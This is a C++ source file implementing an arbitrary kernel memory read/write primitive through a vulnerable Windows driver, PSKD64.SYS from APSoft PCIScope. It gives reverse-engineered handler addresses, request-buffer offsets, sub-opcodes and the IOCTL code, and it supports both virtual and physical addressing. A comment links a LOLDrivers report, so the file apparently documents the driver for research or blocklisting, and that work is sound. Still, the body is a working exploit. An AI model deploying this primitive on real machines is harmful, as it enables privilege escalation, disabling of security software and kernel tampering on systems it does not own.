#include <windows.h>
#include <vector>

/*
// Main Irp handler
sub_2A6C0

// Sub Command 
sub_225B0

// Read path
sub_23718 -> sub_2637C -> sub_262A8

// Write Path
sub_23718 -> sub_2662C -> sub_262A8

Add vulnerable driver: PSKD64.SYS (APSoft PCIScope)
https://github.com/magicsword-io/LOLDrivers/issues/408
*/

#include <windows.h>
#include <vector>

/**
 * Performs reading or writing through the kernel driver's memory access interface.
 * 
 * @param hDriver           Handle to the driver device.
 * @param targetAddress     The physical or virtual memory address to access.
 * @param buffer            Pointer to the user-space buffer (destination for reads, source for writes).
 * @param size              Number of bytes to transfer.
 * @param isRead            True for Read operation, False for Write operation.
 * @param granularity       Chunk size per loop iteration (1 = Byte, 2 = WORD, 4 = DWORD, 8 = QWORD). Default is 4.
 * @param useVirtualAddress Flag indicating virtual vs physical addressing.
 */
bool MemoryAccess(HANDLE hDriver, DWORD64 targetAddress, void* buffer, DWORD size, bool isRead, DWORD granularity = 4, bool useVirtualAddress = true) {
    if (hDriver == INVALID_HANDLE_VALUE || !buffer || size == 0) {
        return false;
    }

    // Validate granularity
    if (granularity != 1 && granularity != 2 && granularity != 4 && granularity != 8) {
        granularity = 4; // Fallback to default DWORD if invalid
    }

    // Allocate base buffer: headers (0xC1) + payload size for BOTH reads and writes
    const size_t baseHeaderSize = 0xC1;
    std::vector<BYTE> reqBuffer(baseHeaderSize + size, 0);
    
    // 1. Setup Request Headers
    DWORD subOpcode = isRead ? 0x701E : 0x701F;
    *reinterpret_cast<DWORD*>(reqBuffer.data() + 0x00) = 1; 
    *reinterpret_cast<DWORD*>(reqBuffer.data() + 0x2C) = subOpcode;
    *reinterpret_cast<DWORD*>(reqBuffer.data() + 0x34) = static_cast<DWORD>(reqBuffer.size());

    // 2. Setup Inner Transfer Packet (starts at offset 0x94)
    reqBuffer[0x94] = 1;                 // AddressSpaceType = 1 (Memory/MMIO)
    reqBuffer[0x95] = (BYTE)granularity; // Granularity passed by user (1, 2, 4, 8)

    if (useVirtualAddress) {
        // --- VIRTUAL ADDRESS MODE ---
        *reinterpret_cast<DWORD64*>(reqBuffer.data() + 0xA4) = targetAddress; // VA Pointer
        *reinterpret_cast<DWORD64*>(reqBuffer.data() + 0x9C) = 0;             // Base set to 0
    } else {
        // --- PHYSICAL ADDRESS MODE ---
        *reinterpret_cast<DWORD64*>(reqBuffer.data() + 0xA4) = 0;             // Disable VA override
        *reinterpret_cast<DWORD64*>(reqBuffer.data() + 0x9C) = targetAddress; // Physical Address
    }

    *reinterpret_cast<DWORD*>(reqBuffer.data() + 0xAC) = size; // Transfer Length

    // 3. If writing, copy source data into payload buffer at offset 0xC0
    if (!isRead) {
        memcpy(reqBuffer.data() + 0xC0, buffer, size);
    }

    // 4. Send IOCTL request
    DWORD bytesReturned = 0;
    BOOL success = DeviceIoControl(
        hDriver, 
        0x220044, // Driver Dispatch IOCTL Code
        reqBuffer.data(), 
        (DWORD)reqBuffer.size(), 
        reqBuffer.data(), 
        (DWORD)reqBuffer.size(), 
        &bytesReturned, 
        nullptr
    );

    // 5. If reading, copy retrieved data from payload buffer at offset 0xC0
    if (success && isRead) {
        memcpy(buffer, reqBuffer.data() + 0xC0, size);
    }

    return (success == TRUE);
}